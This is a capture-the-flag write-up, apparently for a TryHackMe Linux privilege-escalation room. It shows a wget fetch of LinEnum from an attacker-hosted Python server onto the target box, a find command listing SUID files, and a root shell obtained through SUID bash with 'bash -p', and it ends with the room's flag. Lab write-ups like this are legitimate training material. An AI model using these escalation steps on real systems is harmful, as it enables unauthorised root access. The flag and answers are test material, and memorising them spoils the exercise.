### IP
`10.10.58.46`

### What type of privilege escalation involves using a user account to execute commands as an administrator?

`vertical`

### With given credential to access box via ssh and once I am in, I can use linpeas or LinEnum scripts to find out possible privilege escalation holes.

- I download one of scripts to my machine
- go to /tmp folder on a box where we have writing rights
- I launch python3 server to share script to others:
`python3 -m http.server`
- on a box, I download a script with 
`wget http://10.2.46.111:8000/LinEnum.sh` and then give it write rights `chmod +x LinEnum.sh`
- I launch the script and check possible holes.

- I can also find out which files have sticky bit with this command:

`find / -perm -u=s -type f 2>/dev/null`

I realized that in this case `/usr/bin/bash` enables an escalation (which is hilarious and very easy scenario) so according to this website:

`https://gtfobins.github.io/#+suid`

I will become root only by typing `bash -p`

```
absh-4.4$ bash -p
bash-4.4# whoami
root
bash-4.4# 
```

so finally I get a flag:
```
bash-4.4# cd /root
bash-4.4# ls -al
total 28
drwx------  3 root   root    4096 Dec  8 20:43 .
drwxr-xr-x 24 root   root    4096 Dec  8 15:16 ..
-rw-------  1 root   root     168 Dec  9 15:49 .bash_history
-rw-r--r--  1 root   root    3106 Apr  9  2018 .bashrc
-rw-r--r--  1 root   root     148 Aug 17  2015 .profile
drwx------  2 root   root    4096 Dec  8 16:38 .ssh
-rw-r--r--  1 nobody nogroup   23 Dec  8 20:43 flag.txt
bash-4.4# cat flag.txt
thm{2fb10afe933296592}
```
### What are the contents of the file located at /root/flag.txt?

`thm{2fb10afe933296592}`


